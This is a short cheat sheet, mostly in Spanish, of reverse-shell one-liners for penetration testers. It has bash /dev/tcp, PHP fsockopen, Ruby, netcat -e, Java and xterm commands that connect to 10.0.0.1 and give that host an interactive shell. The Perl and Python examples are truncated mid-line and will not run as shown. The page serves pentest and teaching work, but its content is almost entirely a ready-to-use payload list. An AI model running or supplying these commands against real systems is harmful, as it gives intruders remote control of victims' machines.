---
title: Reverse Shell Cheat Sheet
---
Si tienes la suerte de encontrar una vulnerabilidad de ejecución de comandos durante una prueba de penetración, muy pronto después probablemente querrás un shell interactivo.

Si no es posible añadir una nueva cuenta / clave SSH / archivo .rhosts y simplemente iniciar sesión, es probable que tu siguiente paso sea lanzar una shell inversa o vincular una shell a un puerto TCP.  Esta página se ocupa de lo primero.

Tus opciones para crear una shell inversa están limitadas por los lenguajes de scripting instalados en el sistema de destino - aunque probablemente también podrías subir un programa binario si estás adecuadamente preparado.

Los ejemplos mostrados están adaptados a sistemas tipo Unix.  Algunos de los ejemplos siguientes también deberían funcionar en Windows si sustituyes "/bin/sh -i" por "cmd.exe".

El objetivo de cada uno de los métodos que se muestran a continuación es que se puedan copiar y pegar en una sola línea.  Como tales son líneas bastante cortas, pero no muy legibles.

### bash
Algunas versiones de bash pueden enviarte un shell inverso (esto fue probado en Ubuntu 10.10):

``` bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
``` 
------
### PERL
Aquí tienes una versión más corta y sin funciones del perl-reverse-shell:
``` perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in
```
---------
### Python
Esto fue probado en Linux / Python 2.7:
``` python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```
-----
### PHP
Este código asume que la conexión TCP utiliza el descriptor de fichero 3.  Esto funcionó en mi sistema de prueba.  Si no funciona, prueba con 4, 5, 6...

``` php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Si desea un archivo .php para cargar, vea el más funcional y robusto [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). 

---------
### Ruby
``` ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
--------
### Netcat
Netcat rara vez está presente en los sistemas de producción e incluso si lo está hay varias versiones de netcat, algunas de las cuales no soportan la opción -e.
```bash
nc -e /bin/sh 10.0.0.1 1234
```


### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```


[Untested submission from anonymous reader]

### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
```xterm
xterm -display 10.0.0.1:1
```

- Tags: #Reverse-Shells #netcat #python #java #php #bash #perl

